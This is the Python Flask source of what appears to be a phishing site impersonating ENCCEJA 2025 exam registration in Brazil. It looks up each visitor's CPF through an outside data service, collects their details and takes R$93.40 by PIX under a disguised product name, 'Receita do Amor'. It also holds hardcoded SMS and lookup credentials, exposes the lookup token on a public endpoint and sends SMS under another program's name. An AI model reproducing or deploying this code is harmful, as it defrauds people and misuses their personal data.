#!/usr/bin/env python3
"""
ENCCEJA 2025 - Projeto Original Completo
API CPF Corrigida + Todas as funcionalidades originais
Templates externos + WitePay + Facebook Pixels + SMS
"""

import os
import sys
import logging
import requests
import re
import secrets
import functools
import time
import random
import string
import base64
import urllib.parse
from datetime import datetime
from io import BytesIO
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

# Configuracao de encoding UTF-8
if sys.version_info[0] >= 3:
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Configurar Flask
app = Flask(__name__)

# In-memory store for payment status (in production, use Redis or database)
payment_status_store = {}

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')

def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")

            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            # Log the response
            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True, None
            else:
                return False, f"API error: {response.text}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
        return False, str(e)

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Envia SMS usando a API SMSDEV - função mais direta para compatibilidade
    Retorna True se o SMS foi enviado com sucesso, False caso contrário
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"

        # Formatar o número de telefone (remover caracteres não numéricos)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Verificar se está no formato correto com DDD
            # Parâmetros da API
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Fazer a requisição para a API
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)

            # Log da resposta
            app.logger.info(f"[PROD] SMSDEV: SMS enviado para {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True
            else:
                app.logger.error(f"[PROD] Erro na API SMSDEV: {response.text}")
                return False
        else:
            app.logger.error(f"[PROD] Formato de número de telefone inválido: {phone_number}")
            return False

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar SMS via SMSDEV: {str(e)}")
        return False

# Função para gerar e validar códigos de verificação
def generate_verification_code():
    return ''.join(random.choices(string.digits, k=6))

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    # Importar o QRCode dentro da função para garantir que a biblioteca está disponível
    import qrcode
    from qrcode import constants
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(pix_code)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return f"data:image/png;base64,{img_str}"

# === ROTAS PRINCIPAIS ===

@app.route('/')
@app.route('/index')
@check_referer
def index():
    """Página principal - redireciona para /inscricao"""
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
@check_referer
def inscricao():
    """Página de inscrição inicial - renderiza template original"""
    app.logger.info("Renderizando página de inscrição original")
    return render_template('inscricao.html')

@app.route('/encceja-info')
@check_referer
def encceja_info():
    """Informações sobre o ENCCEJA"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando encceja-info")
    return render_template('encceja-info.html', user_data=session['user_data'])

@app.route('/validar-dados')
@check_referer
def validar_dados():
    """Validação de dados pessoais"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando validar-dados")
    return render_template('validar-dados.html', user_data=session['user_data'])

@app.route('/salvar-validacao', methods=['POST'])
@check_referer
def salvar_validacao():
    """Salvar validação e ir para endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Dados validados, redirecionando para endereco")
    return redirect(url_for('endereco'))

@app.route('/endereco')
@check_referer
def endereco():
    """Formulario de endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando endereco")
    return render_template('endereco.html')

@app.route('/salvar-endereco', methods=['POST'])
@check_referer
def salvar_endereco():
    """Salvar endereco na sessao"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    endereco_data = {
        'cep': request.form.get('cep', '01000-000'),
        'cidade': request.form.get('cidade', 'Sao Paulo'),
        'uf': request.form.get('uf', 'SP')
    }
    
    session['endereco_data'] = endereco_data
    app.logger.info(f"Endereco salvo: {endereco_data['cidade']}")
    
    return redirect(url_for('local_prova'))

@app.route('/local-prova')
@check_referer
def local_prova():
    """Selecao do local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando local-prova")
    return render_template('local-prova.html')

@app.route('/salvar-local', methods=['POST'])
@check_referer
def salvar_local():
    """Salvar local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    local = request.form.get('local', 'escola1')
    session['local_prova'] = local
    app.logger.info(f"Local salvo: {local}")
    
    return redirect(url_for('pagamento'))

@app.route('/pagamento')
@check_referer
def pagamento():
    """Página de pagamento PIX - renderiza template original"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando pagina de pagamento original")
    return render_template('pagamento.html', user_data=session['user_data'])

@app.route('/inscricao-sucesso')
@check_referer
def inscricao_sucesso():
    """Pagina de sucesso"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando inscricao-sucesso")
    return render_template('inscricao-sucesso.html', user_data=session['user_data'])

# === APIS E FUNCIONALIDADES ===

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição) - URL CORRIGIDA"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API alternativa funcionando com URL corrigida
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Resposta da API CPF: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Salvar na sessão
                session['user_data'] = user_data
                
                app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF na API: {str(e)}")
        return jsonify({"error": f"Erro interno: {str(e)}", "sucesso": False}), 500

@app.route('/criar-pagamento-pix', methods=['POST'])
@check_referer
def criar_pagamento_pix():
    """Criar pagamento PIX usando WitePay"""
    try:
        # Importar o gateway WitePay
        from witepay_gateway import WitePayGateway
        
        amount = 93.40
        app.logger.info(f"Iniciando pagamento PIX - R$ {amount}")
        
        user_data = session.get('user_data', {})
        
        if not user_data:
            return jsonify({'success': False, 'error': 'Dados do usuário não encontrados'}), 400
        
        # Preparar dados do cliente
        client_data = {
            'clientName': user_data.get('nome', 'Cliente ENCCEJA'),
            'clientDocument': user_data.get('cpf', '00000000000'),
            'clientEmail': 'gerarpagamentos@gmail.com',
            'clientPhone': '11987790088'
        }
        
        # Preparar dados do produto
        product_data = {
            'name': 'Receita do Amor',
            'value': int(amount * 100)  # Valor em centavos
        }
        
        # Criar gateway WitePay
        gateway = WitePayGateway()
        
        # Criar pedido
        order_result = gateway.create_order(client_data, product_data)
        
        if 'error' in order_result:
            app.logger.error(f"Erro ao criar pedido: {order_result['error']}")
            return jsonify({'success': False, 'error': order_result['error']}), 500
        
        order_id = order_result.get('orderId')
        
        # Criar cobrança PIX
        pix_result = gateway.create_pix_charge(order_id)
        
        if 'error' in pix_result:
            app.logger.error(f"Erro ao criar cobrança PIX: {pix_result['error']}")
            return jsonify({'success': False, 'error': pix_result['error']}), 500
        
        # Sucesso - retornar dados do PIX
        transaction_id = pix_result.get('chargeId', f"ENCCEJA{int(time.time())}")
        pix_code = pix_result.get('pixCode') or pix_result.get('qr_code')
        
        # Se não tiver código PIX, gerar um fallback
        if not pix_code:
            app.logger.warning("QR code vazio, gerando PIX com chave fallback")
            pix_key = "gerarpagamentos@gmail.com"
            merchant_name = "Receita do Amor - ENCCEJA"
            merchant_city = "SAO PAULO"
            
            # Construir codigo PIX padrao Banco Central
            pix_code = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
            
            # Calcular CRC16
            def calculate_crc16(data):
                crc = 0xFFFF
                for byte in data.encode('utf-8'):
                    crc ^= byte << 8
                    for _ in range(8):
                        if crc & 0x8000:
                            crc = (crc << 1) ^ 0x1021
                        else:
                            crc <<= 1
                        crc &= 0xFFFF
                return f"{crc:04X}"
            
            pix_base = pix_code[:-4]
            crc = calculate_crc16(pix_base + "6304")
            pix_code = pix_base + "6304" + crc
        
        app.logger.info(f"PIX gerado com sucesso - ID: {transaction_id}")
        
        return jsonify({
            'success': True,
            'pixCode': pix_code,
            'transactionId': transaction_id,
            'amount': amount,
            'method': 'witepay'
        })
        
    except Exception as e:
        app.logger.error(f"Erro ao criar PIX: {e}")
        # Fallback: gerar PIX com chave direta
        try:
            transaction_id = f"ENCCEJA{int(time.time())}"
            amount = 93.40
            
            pix_key = "gerarpagamentos@gmail.com"
            merchant_name = "Receita do Amor - ENCCEJA"
            merchant_city = "SAO PAULO"
            
            # Construir codigo PIX padrao Banco Central
            pix_code = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
            
            # Calcular CRC16
            def calculate_crc16(data):
                crc = 0xFFFF
                for byte in data.encode('utf-8'):
                    crc ^= byte << 8
                    for _ in range(8):
                        if crc & 0x8000:
                            crc = (crc << 1) ^ 0x1021
                        else:
                            crc <<= 1
                        crc &= 0xFFFF
                return f"{crc:04X}"
            
            pix_base = pix_code[:-4]
            crc = calculate_crc16(pix_base + "6304")
            pix_code_final = pix_base + "6304" + crc
            
            return jsonify({
                'success': True,
                'pixCode': pix_code_final,
                'transactionId': transaction_id,
                'amount': amount,
                'method': 'fallback'
            })
        except Exception as fallback_error:
            app.logger.error(f"Erro no fallback PIX: {fallback_error}")
            return jsonify({'success': False, 'error': str(e)}), 500

# === ROTAS DE SISTEMA ===

@app.route('/status')
def status():
    """Status do sistema"""
    return jsonify({
        'status': 'online',
        'projeto': 'ENCCEJA 2025 Original Completo',
        'api_cpf': 'https://consulta.fontesderenda.blog/cpf.php',
        'token': '1285fe4s-e931-4071-a848-3fac8273c55a',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():  
    """Health check"""
    return "OK", 200

@app.route('/test-cpf/<cpf>')
def test_cpf(cpf):
    """Testar API CPF diretamente"""
    try:
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf}&token={token}"
        response = requests.get(url, timeout=10)
        return jsonify({
            'url': url,
            'status': response.status_code,
            'data': response.json() if response.status_code == 200 else response.text
        })
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.logger.info("=== ENCCEJA 2025 - PROJETO ORIGINAL COMPLETO ===")
    app.logger.info("API CPF: https://consulta.fontesderenda.blog/cpf.php")
    app.logger.info("Token: 1285fe4s-e931-4071-a848-3fac8273c55a")
    app.logger.info("Templates: Externos (pasta templates/)")
    app.logger.info("WitePay: Habilitado")
    app.logger.info("Facebook Pixels: Habilitado")
    app.logger.info("SMS: SMSDEV Habilitado")
    app.logger.info("Iniciando na porta 5000...")
    app.run(host='0.0.0.0', port=5000, debug=True)